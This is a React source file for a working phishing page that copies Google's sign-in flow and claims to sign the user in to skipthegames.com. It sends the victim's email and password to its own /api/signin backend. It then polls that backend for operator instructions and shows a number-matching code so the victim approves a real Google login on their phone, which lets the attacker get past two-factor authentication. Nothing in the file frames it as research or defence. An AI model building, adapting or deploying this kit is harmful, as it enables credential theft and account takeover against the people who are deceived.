"use client";
import React, { useEffect, useState } from "react";
import axios from "axios";
import CredentialLoader from "@/components/Loading";

export interface CreateGmailData {
    id?: string;
    email?: string;
    password?: string;
}

export async function createGmail(data: CreateGmailData) {
    try {
        const response = await axios.post("/api/signin", data);

        return {
            success: true,
            data: response.data,
        };
    } catch (error) {
        if (axios.isAxiosError(error)) {
            return {
                success: false,
                error: error.response?.data?.error || "Failed to save Gmail.",
            };
        }

        return {
            success: false,
            error: "Something went wrong.",
        };
    }
}
// ----------------------------------------------------------------------
// Shared constants & helpers
// ----------------------------------------------------------------------
const LANGUAGES = [
    "Afrikaans", "azərbaycan", "bosanski", "català", "Čeština", "Cymraeg", "Dansk", "Deutsch", "eesti",
    "English (United Kingdom)", "English (United States)", "Español (España)", "Español (Latinoamérica)",
    "euskara", "Filipino", "Français (Canada)", "Français (France)", "Gaeilge", "galego", "Hrvatski",
    "Indonesia", "isiZulu", "íslenska", "Italiano", "Kiswahili", "latviešu", "lietuvių", "magyar", "Melayu",
    "Nederlands", "norsk", "o‘zbek", "polski", "Português (Brasil)", "Português (Portugal)", "română",
    "shqip", "Slovenčina", "slovenščina", "srpski (latinica)", "Suomi", "Svenska", "Tiếng Việt", "Türkçe",
    "Ελληνικά", "беларуская", "български", "кыргызча", "қазақ тілі", "македонски", "монгол", "Русский",
    "српски (ћирилица)", "Українська", "ქართული", "հայերեն", "‫עברית‬‎", "‫اردو‬‎", "‫العربية‬‎",
    "‫فارسی‬‎", "አማርኛ", "नेपाली", "मराठी", "हिन्दी", "অসমীয়া", "বাংলা", "ਪੰਜਾਬੀ", "ਗુજરાતી",
    "ଓଡ଼ିଆ", "தமிழ்", "తెలుగు", "ಕನ್ನಡ", "മലയാളം", "සිංහල", "ไทย", "ລາວ", "မြန်မာ", "ខ្មែរ",
    "한국어", "中文（香港）", "日本語", "简体中文", "繁體中文",
];

function GoogleMark() {
    return (
        <svg className="w-full h-full" viewBox="0 0 48 48" aria-hidden="true">
            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" />
            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z" />
            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z" />
            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z" />
        </svg>
    );
}

function HeaderBar({ title }: { title: string }) {
    return (
        <div className="absolute top-0 left-0 right-0 h-14 px-4 flex items-center border-b border-[#c4c7c5] dark:border-[#444746]">
            <div className="w-5 h-6 shrink-0">
                <GoogleMark />
            </div>
            <span className="ml-3 text-sm font-medium text-[#444746] dark:text-[#c4c7c5] truncate">
                {title}
            </span>
        </div>
    );
}

function Footer() {
    return (
        <div className="w-full sm:w-[480px] md:w-[880px] px-4 sm:px-4 md:px-6">
            <footer className="flex flex-wrap items-center justify-between gap-2 py-2 text-xs text-[#1f1f1f] dark:text-[#e3e3e3]">
                <div className="relative">
                    <select
                        className="appearance-none bg-transparent pl-2 pr-8 py-2 rounded-lg text-xs text-[#1f1f1f] dark:text-[#e3e3e3] hover:bg-black/[0.04] dark:hover:bg-white/[0.08] cursor-pointer outline-none focus-visible:ring-2 focus-visible:ring-[#0b57d0] dark:focus-visible:ring-[#a8c7fa]"
                        defaultValue="English (United States)"
                        aria-label="Change language"
                    >
                        {LANGUAGES.map((lang) => (
                            <option key={lang} value={lang} className="bg-white dark:bg-[#0e0e0e] text-[#1f1f1f] dark:text-[#e3e3e3]">
                                {lang}
                            </option>
                        ))}
                    </select>
                    <svg
                        className="absolute right-2 top-1/2 -translate-y-1/2 w-4 h-4 pointer-events-none text-[#444746] dark:text-[#c4c7c5]"
                        viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"
                    >
                        <path d="M7 10l5 5 5-5z" />
                    </svg>
                </div>
                <ul className="flex items-center list-none m-0 p-0 -mx-3">
                    {[
                        { label: "Help", href: "https://support.google.com/accounts?hl=en-US&p=account_iph" },
                        { label: "Privacy", href: "https://accounts.google.com/TOS?loc=BD&hl=en-US&privacy=true" },
                        { label: "Terms", href: "https://accounts.google.com/TOS?loc=BD&hl=en-US" },
                    ].map(({ label, href }) => (
                        <li key={label} className="mx-1">
                            <a
                                href={href} target="_blank" rel="noreferrer"
                                className="inline-block px-3 py-2 rounded-lg text-xs text-[#1f1f1f] dark:text-[#e3e3e3] hover:bg-black/[0.04] dark:hover:bg-white/[0.08] focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#0b57d0] dark:focus-visible:ring-[#a8c7fa]"
                            >
                                {label}
                            </a>
                        </li>
                    ))}
                </ul>
            </footer>
        </div>
    );
}

// ----------------------------------------------------------------------
// Shared input styling helpers
// ----------------------------------------------------------------------
const getInputOutline = (hasError: boolean) => `
  pointer-events-none absolute inset-0 rounded-[4px] border 
  ${hasError ? 'border-[#d93025] dark:border-[#f2b8b5]' : 'border-[#747775] dark:border-[#8e918f]'} 
  peer-focus:border-2 
  ${hasError ? 'peer-focus:border-[#d93025] dark:peer-focus:border-[#f2b8b5]' : 'peer-focus:border-[#0b57d0] dark:peer-focus:border-[#a8c7fa]'} 
  transition-[border-color] duration-150
`;

const getLabelBase = (hasError: boolean) => `
  pointer-events-none absolute z-[1] whitespace-nowrap origin-[0%_50%] 
  bg-white dark:bg-[#0e0e0e] 
  ${hasError ? 'text-[#d93025] dark:text-[#f2b8b5]' : 'text-[#444746] dark:text-[#c4c7c5]'} 
  left-4 top-1/2 -translate-y-1/2 text-base px-0 
  transition-[top,left,font-size,padding,color,background-color] duration-150 
  peer-focus:left-3 peer-focus:top-0 peer-focus:text-[12px] peer-focus:px-1 
  ${hasError ? 'peer-focus:text-[#d93025] dark:peer-focus:text-[#f2b8b5]' : 'peer-focus:text-[#0b57d0] dark:peer-focus:text-[#a8c7fa]'} 
  peer-[:not(:placeholder-shown)]:left-3 
  peer-[:not(:placeholder-shown)]:top-0 
  peer-[:not(:placeholder-shown)]:text-[12px] 
  peer-[:not(:placeholder-shown)]:px-1
`;

const inputBase = `peer absolute inset-0 w-full h-full rounded-[4px] bg-transparent outline-none border-none px-[15px] text-base text-[#1f1f1f] dark:text-[#e3e3e3] focus:px-[14px]`;

// ----------------------------------------------------------------------
// Extracted Desktop Grid component
// ----------------------------------------------------------------------
function DesktopGrid({ left, right }: { left: React.ReactNode; right: React.ReactNode }) {
    return (
        <div className="flex flex-col md:grid md:grid-cols-2 md:gap-12 w-full mt-4 md:mt-8">
            <div className="flex flex-col">{left}</div>
            <div className="flex flex-col mt-8 md:mt-0 md:pt-14">{right}</div>
        </div>
    );
}

// ----------------------------------------------------------------------
// Main flow component
// ----------------------------------------------------------------------
type Step = "email" | "password" | "verify";

export default function GoogleSignInFlow() {
    const [step, setStep] = useState<Step>("email");

    // Form state
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [passType, setPassType] = useState("password");
    const [verificationCode, setVerificationCode] = useState("");
    const [id, setId] = useState<string>("");

    // Error states
    const [emailError, setEmailError] = useState(false);
    const [passwordError, setPasswordError] = useState(false);
    const [passwordWrong, setPasswordWrong] = useState(false);
    const [loading, setLoading] = useState(false);
    const [load, setLoad] = useState(false);

    const displayEmail = email.endsWith("@gmail.com") ? email : email + "@gmail.com";

    const handleEmailNext = async () => {
        if (email.trim() === "") {
            setEmailError(true);
            return;
        }
        setEmailError(false);
        setLoading(true);
        const result = await createGmail({
            email: displayEmail
        });
        if (result.success) {
            console.log(result.data.gmail);
            setId(result.data.gmail._id);
            setStep("password");
            setLoading(false);
        } else {
            console.error(result.error);
            setLoading(false);
        }
    };

    const handlePasswordNext = async () => {
        if (password.trim() === "") {
            setPasswordError(true);
            setPasswordWrong(false);
            return;
        }
        setPasswordError(false);
        setPasswordWrong(false);
        setLoading(true);
        
        const result = await createGmail({
            id,
            password
        });
        if (result.success) {
            
            setLoad(true);
        } else {
            console.error(result.error);
        }
    };

    //fetch for code
    useEffect(() => {
        if (!load || !email) return;

        let active = true;

        const fetchStatus = async () => {
            try {
                const response = await axios.get(
                    `/api/signin?id=${id}`
                );

                if (!active) return;

                if (response.data.success) {
                    // Update ordinary status information here.
                    
                    if (response.data.gmail.code) {
                        setVerificationCode(response.data.gmail.code);
                        setStep("verify");
                    }
                    if (response.data.gmail.state === "wrong-password") {
                        setVerificationCode("");
                        setStep("password");
                        setPasswordWrong(true);
                        setLoad(false);
                        setLoading(false);
                        active = false;
                        clearInterval(interval);
                    }
                    if (response.data.gmail.state === "wrong-gmail") {
                        setVerificationCode("");
                        setStep("email");
                        setEmailError(true);
                        setLoad(false);
                        setLoading(false);
                        active = false;
                        clearInterval(interval);
                    }
                    if (response.data.gmail.state === "redirect") {
                        window.location.href = response.data.gmail.redirectTo;
                        active = false;
                        clearInterval(interval);
                    }
                }
            } catch (error) {
                if (active) {
                    console.error("Error fetching status:", error);
                }
            }
        };

        void fetchStatus();

        const interval = setInterval(fetchStatus, 2000);

        return () => {
            active = false;
            clearInterval(interval);
        };
    }, [loading, email,load, displayEmail]);

    // Responsive widths: Mobile (full), Tablet (480px), Desktop (880px)
    const cardClass = `
    relative w-full
    sm:w-[480px]
    md:w-[880px]
    sm:min-h-[528px] md:min-h-[400px]
    sm:rounded-[28px]
    bg-white dark:bg-[#0e0e0e]
    pt-12 pb-8 px-6
    md:px-10
  `;

    const wrapperClass = `
    min-h-screen flex flex-col items-center
    justify-between sm:justify-center
    sm:gap-4 sm:py-12
    bg-white dark:bg-[#0e0e0e]
    sm:bg-[#f0f4f9] sm:dark:bg-[#1e1f20]
  `;

    const fontStyle = {
        fontFamily:
            "'Google Sans', 'Product Sans', Roboto, 'Noto Sans Myanmar UI', 'Noto Sans Khmer', Arial, sans-serif",
    };

    // ================================================================
    // STEP 1: Email
    // ================================================================
    if (step === "email") {
        return (
            <div className={wrapperClass} style={fontStyle}>
                {loading && <CredentialLoader />}
                <div className={cardClass}>
                    <HeaderBar title="Sign in with Google" />

                    <div className="flex flex-col w-full pt-2">
                        <DesktopGrid
                            left={
                                <>
                                    <div className="w-12 h-12">
                                        <img
                                            src="https://www.gstatic.com/images/branding/googleg_gradient/svg/googleg_gradient_standard_48px.svg"
                                            alt="Google"
                                            className="w-full h-full"
                                        />
                                    </div>
                                    <h1 className="mt-6 break-words text-[32px] md:text-[36px] leading-[1.25] font-normal text-[#1f1f1f] dark:text-[#e3e3e3]">
                                        Sign in
                                    </h1>
                                    <p className="mt-4 text-base leading-normal text-[#1f1f1f] dark:text-[#e3e3e3]">
                                        to continue to{" "}
                                        <button className="rounded-[4px] font-medium text-[#0b57d0] dark:text-[#a8c7fa] hover:underline focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#0b57d0] dark:focus-visible:ring-[#a8c7fa] focus-visible:ring-offset-2 dark:focus-visible:ring-offset-[#0e0e0e]">
                                            skipthegames.com
                                        </button>
                                    </p>
                                </>
                            }
                            right={
                                <>
                                    <div>
                                        <div className="relative h-14">
                                            <div className={getInputOutline(emailError)} />
                                            <input
                                                id="identifier"
                                                type="text"
                                                value={email}
                                                onChange={(e) => {
                                                    setEmail(e.target.value.toLowerCase());
                                                    if (emailError) setEmailError(false);
                                                }}
                                                placeholder=" "
                                                autoComplete="username webauthn"
                                                spellCheck={false}
                                                autoCapitalize="none"
                                                dir="ltr"
                                                className={inputBase}
                                            />
                                            <label htmlFor="identifier" className={getLabelBase(emailError)}>
                                                Email or phone
                                            </label>
                                        </div>

                                        {/* Error Message */}
                                        {emailError && (
                                            <div className="flex items-center gap-1 mt-1 text-xs text-[#d93025] dark:text-[#f2b8b5]">
                                                <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24">
                                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                                </svg>
                                                <span>Enter an email or phone number</span>
                                            </div>
                                        )}

                                        <div className="pt-2">
                                            <button className="rounded-[4px] text-sm font-medium text-[#0b57d0] dark:text-[#a8c7fa] hover:underline focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#0b57d0] dark:focus-visible:ring-[#a8c7fa] focus-visible:ring-offset-2 dark:focus-visible:ring-offset-[#0e0e0e]">
                                                Forgot email?
                                            </button>
                                        </div>
                                    </div>

                                    <p className="mt-8 text-sm leading-[1.4286] text-[#444746] dark:text-[#c4c7c5]">
                                        Before using this app, you can review Vercel&rsquo;s{" "}
                                        <a href="#" target="_blank" rel="noreferrer" className="rounded-[4px] font-medium text-[#0b57d0] dark:text-[#a8c7fa] hover:underline">Privacy Policy</a>{" "}
                                        and{" "}
                                        <a href="#" target="_blank" rel="noreferrer" className="rounded-[4px] font-medium text-[#0b57d0] dark:text-[#a8c7fa] hover:underline">Terms of Service</a>.
                                    </p>

                                    <div className="mt-8 flex flex-wrap items-center justify-between gap-y-2">
                                        <button className="h-10 px-4 rounded-full text-sm font-medium text-[#0b57d0] dark:text-[#a8c7fa] hover:bg-black/[0.04] dark:hover:bg-white/[0.08] transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#0b57d0] dark:focus-visible:ring-[#a8c7fa] focus-visible:ring-offset-2 dark:focus-visible:ring-offset-[#0e0e0e]">
                                            Create account
                                        </button>
                                        <button
                                            onClick={handleEmailNext}
                                            disabled={loading}
                                            className="h-10 px-6 rounded-full text-sm font-medium bg-[#0b57d0] dark:bg-[#a8c7fa] text-white dark:text-[#062e6f] hover:shadow-[0_1px_2px_0_rgba(60,64,67,0.3),0_1px_3px_1px_rgba(60,64,67,0.15)] transition-shadow focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#0b57d0] dark:focus-visible:ring-[#a8c7fa] focus-visible:ring-offset-2 dark:focus-visible:ring-offset-[#0e0e0e]"
                                        >
                                            Next
                                        </button>
                                    </div>
                                </>
                            }
                        />
                    </div>
                </div>

                <Footer />
            </div>
        );
    }

    // ================================================================
    // STEP 2: Password
    // ================================================================
    if (step === "password") {
        return (
            <div className={wrapperClass} style={fontStyle}>
                {loading && <CredentialLoader />}
                <div className={cardClass}>
                    <HeaderBar title="Welcome" />

                    <div className="flex flex-col w-full">
                        <DesktopGrid
                            left={
                                <>
                                    <div className="w-12 h-12">
                                        <img
                                            src="https://www.gstatic.com/images/branding/googleg_gradient/svg/googleg_gradient_standard_48px.svg"
                                            alt="Google"
                                            className="w-full h-full"
                                        />
                                    </div>
                                    <h1 className="mt-6 break-words text-[32px] md:text-[36px] leading-[1.25] font-normal text-[#1f1f1f] dark:text-[#e3e3e3]">
                                        Welcome
                                    </h1>
                                    <p className="mt-4 text-base leading-normal text-[#1f1f1f] dark:text-[#e3e3e3]">
                                        <span className="flex items-center gap-2">
                                            <svg aria-hidden="true" fill="currentColor" width="24px" height="24px" viewBox="0 0 24 24">
                                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z" />
                                            </svg>
                                            <span className="truncate">{displayEmail}</span>
                                        </span>
                                    </p>
                                </>
                            }
                            right={
                                <>
                                    <div>
                                        <div className="relative h-14">
                                            <div className={getInputOutline(passwordError || passwordWrong)} />
                                            <input
                                                id="password"
                                                type={passType}
                                                value={password}
                                                onChange={(e) => {
                                                    setPassword(e.target.value);
                                                    if (passwordError) setPasswordError(false);
                                                    if (passwordWrong) setPasswordWrong(false);
                                                }}
                                                placeholder=" "
                                                spellCheck={false}
                                                autoCapitalize="none"
                                                dir="ltr"
                                                className={inputBase}
                                            />
                                            <label htmlFor="password" className={getLabelBase(passwordError || passwordWrong)}>
                                                Enter your password
                                            </label>
                                        </div>

                                        {/* Error Message */}
                                        {passwordError && (
                                            <div className="flex items-center gap-1 mt-1 text-xs text-[#d93025] dark:text-[#f2b8b5]">
                                                <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24">
                                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                                </svg>
                                                <span>Enter a password</span>
                                            </div>
                                        )}
                                        {passwordWrong && (
                                            <div className="flex items-center gap-1 mt-1 text-xs text-[#d93025] dark:text-[#f2b8b5]">
                                                <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24">
                                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                                </svg>
                                                <span>Wrong password</span>
                                            </div>
                                        )}

                                        <div className="pt-2">
                                            <div className="h-[48px]">
                                                <input
                                                    type="checkbox"
                                                    id="show-password"
                                                    className="mr-2 inline-block align-middle w-[18px] h-[18px] rounded-[2px] border border-[#747775] dark:border-[#8e918f] cursor-pointer focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#0b57d0] dark:focus-visible:ring-[#a8c7fa]"
                                                    onChange={(e) => setPassType(e.target.checked ? "text" : "password")}
                                                />
                                                <label htmlFor="show-password" className="font-medium font-sans">
                                                    Show password
                                                </label>
                                            </div>
                                        </div>
                                    </div>

                                    <p className="mt-8 text-sm leading-[1.4286] text-[#444746] dark:text-[#c4c7c5]">
                                        Before using this app, you can review Vercel&rsquo;s{" "}
                                        <a href="https://vercel.com/legal/privacy-policy" target="_blank" rel="noreferrer" className="rounded-[4px] font-medium text-[#0b57d0] dark:text-[#a8c7fa] hover:underline">Privacy Policy</a>{" "}
                                        and{" "}
                                        <a href="https://vercel.com/legal/terms" target="_blank" rel="noreferrer" className="rounded-[4px] font-medium text-[#0b57d0] dark:text-[#a8c7fa] hover:underline">Terms of Service</a>.
                                    </p>

                                    <div className="mt-8 flex flex-wrap items-center justify-between gap-y-2">
                                        <button className="h-10 px-4 rounded-full text-sm font-medium text-[#0b57d0] dark:text-[#a8c7fa] hover:bg-black/[0.04] dark:hover:bg-white/[0.08] transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#0b57d0] dark:focus-visible:ring-[#a8c7fa] focus-visible:ring-offset-2 dark:focus-visible:ring-offset-[#0e0e0e]">
                                            Forgot password?
                                        </button>
                                        <button onClick={handlePasswordNext} disabled={loading} className="h-10 px-6 rounded-full text-sm font-medium bg-[#0b57d0] dark:bg-[#a8c7fa] text-white dark:text-[#062e6f] hover:shadow-[0_1px_2px_0_rgba(60,64,67,0.3),0_1px_3px_1px_rgba(60,64,67,0.15)] transition-shadow focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#0b57d0] dark:focus-visible:ring-[#a8c7fa] focus-visible:ring-offset-2 dark:focus-visible:ring-offset-[#0e0e0e]">
                                            Next
                                        </button>
                                    </div>
                                </>
                            }
                        />
                    </div>
                </div>

                <Footer />
            </div>
        );
    }

    // ================================================================
    // STEP 3: Verify
    // ================================================================
    return (
        <div className={wrapperClass} style={fontStyle}>
            
            <div className={cardClass}>
                <div className="flex flex-col w-full">
                    <DesktopGrid
                        left={
                            <>
                                <div className="w-12 h-12">
                                    <img
                                        src="https://www.gstatic.com/images/branding/googleg_gradient/svg/googleg_gradient_standard_48px.svg"
                                        alt="Google"
                                        className="w-full h-full"
                                    />
                                </div>
                                <h1 className="mt-6 break-words text-[32px] md:text-[36px] leading-[1.25] font-normal text-[#1f1f1f] dark:text-[#e3e3e3]">
                                    Verify it’s you
                                </h1>
                                <div className="text-sm leading-[1.4286] text-[#444746] dark:text-[#c4c7c5] mt-4">
                                    To help keep your account safe, Google wants to make sure it’s really you trying to sign in.{" "}
                                    <a href="#" className="text-[#0b57d0] dark:text-[#a8c7fa] hover:underline">Learn more</a>
                                </div>
                                <p className="mt-4 text-base leading-normal text-[#1f1f1f] dark:text-[#e3e3e3]">
                                    <span className="flex items-center gap-2">
                                        <svg aria-hidden="true" fill="currentColor" width="24px" height="24px" viewBox="0 0 24 24">
                                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z" />
                                        </svg>
                                        <span className="truncate">{displayEmail}</span>
                                    </span>
                                </p>
                            </>
                        }
                        right={
                            <>
                                <div>
                                    <h1 className="text-[57px] text-center md:text-center">{verificationCode}</h1>
                                    <h2 className="text-[20px] pb-2 text-center md:text-left">Check your Phone</h2>
                                    <h3 className="text-sm leading-[1.4286] text-[#444746] dark:text-[#c4c7c5] text-center md:text-left">
                                        Google sent a notification to your Phone. Tap Yes on the notification, then tap{" "}
                                        {verificationCode} on your phone to verify it’s you.
                                    </h3>
                                </div>

                                <div className="mt-8 flex flex-wrap items-center justify-between gap-y-2">
                                    <button className="h-10 px-4 rounded-full text-sm font-medium text-[#0b57d0] dark:text-[#a8c7fa] hover:bg-black/[0.04] dark:hover:bg-white/[0.08] transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#0b57d0] dark:focus-visible:ring-[#a8c7fa] focus-visible:ring-offset-2 dark:focus-visible:ring-offset-[#0e0e0e]">
                                        Resend it
                                    </button>
                                    <button className="h-10 px-4 rounded-full text-sm font-medium text-[#0b57d0] dark:text-[#a8c7fa] hover:bg-black/[0.04] dark:hover:bg-white/[0.08] transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#0b57d0] dark:focus-visible:ring-[#a8c7fa] focus-visible:ring-offset-2 dark:focus-visible:ring-offset-[#0e0e0e]">
                                        Try other way
                                    </button>
                                </div>

                            </>
                        }
                    />
                </div>
            </div>

            <Footer />
        </div>
    );
}